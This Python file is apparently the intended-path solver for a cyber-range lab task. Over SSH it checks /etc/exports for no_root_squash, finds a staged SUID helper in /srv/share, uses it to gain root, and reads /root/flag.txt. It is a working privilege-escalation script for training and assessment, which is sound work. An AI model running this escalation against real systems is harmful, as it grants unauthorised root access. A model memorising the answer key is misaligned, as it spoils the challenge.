"""Intended-path solver: execute the staged SUID helper from the share."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

READ_EXPORTS = "cat /etc/exports 2>/dev/null || true"
FIND_SUID = "find /srv/share -perm -4000 -type f 2>/dev/null || true"


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        _, stdout, _ = client.exec_command(READ_EXPORTS, timeout=15)
        exports_out = stdout.read().decode(errors="replace")
        if "no_root_squash" not in exports_out:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="share-suid-exec",
                        ok=False,
                        captured=None,
                        detail=f"/etc/exports lacks no_root_squash line: {exports_out[:200]}",
                    )
                ]
            )

        _, stdout, stderr = client.exec_command(FIND_SUID, timeout=20)
        suid_out = stdout.read().decode(errors="replace")
        helpers = [line.strip() for line in suid_out.splitlines() if line.strip()]
        if not helpers:
            err = stderr.read().decode(errors="replace")
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="share-suid-exec",
                        ok=False,
                        captured=None,
                        detail=f"no SUID file staged under /srv/share (err={err[:200]})",
                    )
                ]
            )

        helper = helpers[0]
        _, stdout, stderr = client.exec_command(f"{helper} -c id", timeout=20)
        whoami = stdout.read().decode(errors="replace")
        if "uid=0(root)" not in whoami:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="share-suid-exec",
                        ok=False,
                        captured=None,
                        detail=f"helper did not grant root (out={whoami[:200]})",
                    )
                ]
            )

        _, stdout, stderr = client.exec_command(f'{helper} -c "cat /root/flag.txt"', timeout=20)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        flags = find_flags(out)
        captured = flags[0] if flags else None
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="share-suid-exec",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"staged helper produced no flag (err={err[:200]}, out={out[:200]})",
            )
        ]
    )
